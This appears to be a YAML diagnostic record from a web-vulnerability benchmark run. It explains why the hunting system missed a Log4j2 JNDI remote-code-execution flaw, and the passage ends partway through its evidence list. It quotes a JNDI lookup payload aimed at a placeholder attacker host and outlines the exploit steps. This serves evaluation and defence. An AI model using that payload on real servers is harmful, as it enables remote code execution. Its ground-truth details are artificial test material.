- vuln: white-jotter-004
  failure_mode: modeller_failed_unit-fault_binding
  root_cause:
    type: kb_coverage_gap
    combination_of: [design_defect]
    extended_description: |-
      The ground truth is a JNDI injection through a crafted username. The exploit registers an account whose username is ${jndi:rmi://<attacker-host>:<port>/<name>} at /api/register, signs in, then requests /api/admin/user; the server writes the caller-controlled username to its log through a vulnerable Log4j2 configuration, the logging framework resolves the lookup against the attacker's service, and verify/verify.py observes the shared RCE canary (white-jotter-004/metadata.json, report.md, exploits/exploit.py, verify/verify.py). The GT location /api/admin/user is the unauthorized access that triggers the logged username.

      Both owning units were modelled this run and neither binds a logging sink, a lookup evaluation or a caller-controlled log field. Service:register's vulnerabilities are V-1 concurrent duplicate account creation, V-2 account-name canonicalisation collision and V-3 credential policy enforcing non-emptiness only; its threats are threat-1 (concurrent-duplication, risk 9) and threat-2 (business-logic, risk 2). Service:user-administration's only vulnerability is V-1 "account writes operating blind against a name while the only read of the table is dead" (business-logic) and it produced zero threats; the unit's completion note records the dead roster as a structural availability precursor and never touches a logging path.

      A case-insensitive search of the whole hunting tree (threat models, notes, specs, pod logs) for jndi, log4j or log4shell returns nothing, and no spec or pod registers a JNDI-shaped username or requests /api/admin/user with one.

      The suite has no class for this chain. skills/web-vulnerability-testing/rce/ contains only rce-command-injection and rce-pipeline-execution; a search of skills/ for jndi, log4j or log4shell finds no leaf, and the ldap-injection parent is a different sink. The knowledge base therefore cannot bind "caller-controlled username -> log record -> JNDI lookup" even in principle.

      A design gap compounds it: neither the unit projection nor the technical-sharpening step inventories the logging dependency. The application declares spring-boot-starter-log4j2 in pom.xml and ships src/main/resources/log4j2.xml, but no unit model records the logging framework, its version, or which caller-controlled values reach it. The RCE family asks for a dependency inventory where the runtime is identifiable; that step was never applied to the logging stack.

      The dispatch starvation also applies to these units (Service:user-administration has no threat to dispatch; Service:register's threat-2 is demoted at risk 2), but even a dispatched register threat would not seek a logging lookup. The GT miss is the unbound fault and the absent class.
  diagnosis_overview: |-
    white-jotter-004 is a JNDI/Log4j2 RCE: register username ${jndi:rmi://...}, sign in, access /api/admin/user, and the server logs the username through a vulnerable Log4j2 and contacts the attacker's lookup service; the verifier checks the shared RCE canary.
    Both owning units were modelled this run (Service:register and Service:user-administration), but neither binds a logging-sink fault: register's vulnerabilities are duplicate creation, name canonicalisation and credential policy, and user-administration's is the dead roster. No model, threat, spec, pod or note mentions JNDI, log4j or Log4Shell.
    The suite has no logging-sink/JNDI class: the rce family holds only command injection and pipeline execution, and a search of skills/ for jndi or log4j finds no leaf. The KB cannot bind the chain even in principle.
    The application declares spring-boot-starter-log4j2 and ships log4j2.xml, but no unit inventories the logging framework or which caller-controlled fields reach it.
    Typed root cause: a knowledge-base coverage gap for a logging-sink JNDI lookup (kb_coverage_gap), combined with a design gap that never inventories the logging stack (design_defect).
  evidences:
  - source: ground_truth
    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-004/metadata.json
    note: |-
      Location http://wj:8443/api/admin/user, Vulnerability Type "Remote Code Execution"; the report names a vulnerable Log4j2 configuration and a JNDI lookup expression in the username.
  - source: ground_truth
